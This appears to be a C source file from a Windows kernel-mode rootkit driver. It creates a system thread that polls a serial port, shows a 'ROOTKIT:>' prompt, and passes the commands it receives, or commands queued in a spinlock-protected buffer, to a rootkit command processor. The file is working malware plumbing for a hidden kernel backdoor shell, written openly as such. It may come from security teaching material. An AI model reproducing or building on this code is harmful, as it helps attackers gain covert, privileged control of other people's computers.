
#include "ntddk.h"
#include "common.h"
#include "serial.h"
#include "shell.h"
#include "command.h"

// command thread
KSPIN_LOCK		GlobalArraySpinLock;
BOOL			g_kill_thread = FALSE;
HANDLE			gWorkerThread;
char			g_command_signal[256];
KEVENT			command_signal_event;

// routines that handle commands
VOID rootkit_command_thread(PVOID context);  


VOID QueueCommand( char *cmd )
{
	KIRQL aIrqL;

	//----[ spinlock ]-------------------------------
	KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
	memcpy(g_command_signal, cmd, 255);
	KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
	//-----------------------------------------------

	KeSetEvent(&command_signal_event, 1, FALSE);
}

VOID StartCommandThread()
{
	KeInitializeSpinLock(&GlobalArraySpinLock);
	KeInitializeEvent(&command_signal_event, NotificationEvent, 0);

	PsCreateSystemThread( 	&gWorkerThread,
							(ACCESS_MASK) 0L,
							NULL,
							(HANDLE) 0L,
							NULL,
							rootkit_command_thread,
							NULL);
}

VOID KillCommandThread()
{
	PVOID				   aThreadPtr;
	
	//-------------------------------------------
	// kill worker thread
	g_kill_thread = TRUE;
	DbgPrint("rootkit: killing worker thread\n");

	//GET pointer for thread handle
	ObReferenceObjectByHandle( 
		gWorkerThread, 
		THREAD_ALL_ACCESS, 
		NULL, 
		KernelMode, 
		&aThreadPtr, 
		NULL 
		); 
		
	//should be OK at PASSIVE_LEVEL
	KeWaitForSingleObject(	
		aThreadPtr,
		UserRequest,
		KernelMode,
		FALSE,
		NULL);

	//done with thread ptr
	ObDereferenceObject( aThreadPtr );
	//--------------------------------------------
}

VOID snip( char *p )
{
	while(*p){ 
		if(*p == '\r' || *p == '\n'){ *p = '\0'; return; }
		p++;
	}
}

// --------------------------------------------------------
// wait for commands and execute them in IRQL_PASSIVE level
// --------------------------------------------------------
VOID rootkit_command_thread(PVOID context)
{
	int curr_stringoff = 0;
	char _aConsoleCommandString[255];
	
	DbgPrint("thread: workerthread entry\n");

	DbgPrint("Rootkit: sending information over serial port.\n");
	SendInformationToSerialPort("\r\nROOTKIT:>");
	memset(_aConsoleCommandString, '\0', 255);

	for(;;)
	{
		LARGE_INTEGER timeout;
		NTSTATUS waitstatus;
		KIRQL aIrqL;

		// command string
		char _safe_buffer[256];
		_safe_buffer[255]='\0';

		timeout.QuadPart = -(100 * 100);

		__asm
		{
			nop
			nop
			nop
			nop
		}

		waitstatus = KeWaitForSingleObject(	
								&command_signal_event,
								Executive,
								KernelMode,
								FALSE,
								&timeout);
				
		if(g_kill_thread) 
		{
			// we have been shutdown by the UnLoad()
			// routine, so get out of dodge...
			PsTerminateSystemThread(0);
		}
		else if(waitstatus == STATUS_TIMEOUT)
		{
			UCHAR aByte;
			UCHAR regContents;
			
			// poll serial line for characters
			regContents = READ_PORT_UCHAR( COM_PORT + LINE_STATUS_REGISTER );
			if(regContents & 1)
			{
				// characters are present, read them in a loop until clear
				while(curr_stringoff<250)
				{
					aByte = READ_PORT_UCHAR( COM_PORT + RECV_BUFFER_REGISTER );
					regContents = READ_PORT_UCHAR( COM_PORT + LINE_STATUS_REGISTER );
					
					// process command, reset loop
					if(aByte == '\n')
					{
						snip(_aConsoleCommandString);
						process_rootkit_command(_aConsoleCommandString);
						SendInformationToSerialPort("\r\nROOTKIT:>");

						memset(_aConsoleCommandString, '\0', 255);
						curr_stringoff = 0;
					}
					else
					{
						_aConsoleCommandString[curr_stringoff] = (char)aByte;
						curr_stringoff++;
					}

					//DbgPrint("-- %s", _aConsoleCommandString);

					if(!(regContents & 1)) break;
				}
			}
		}
		else
		{
			// check the command which is waiting in a 
			// global buffer.  Copy this buffer into a
			// safe-zone.

			//----[ spinlock ]-------------------------------
			KeAcquireSpinLock(&GlobalArraySpinLock, &aIrqL);
			memcpy(_safe_buffer, g_command_signal, 255);
			KeReleaseSpinLock(&GlobalArraySpinLock, aIrqL);
			//-----------------------------------------------
			
			// we are running at IRQL_PASSIVE so we can make
			// calls to kernel API routines in our commands
			// processor
			process_rootkit_command(_safe_buffer);
			
			KeResetEvent(&command_signal_event);
		}
	}
}
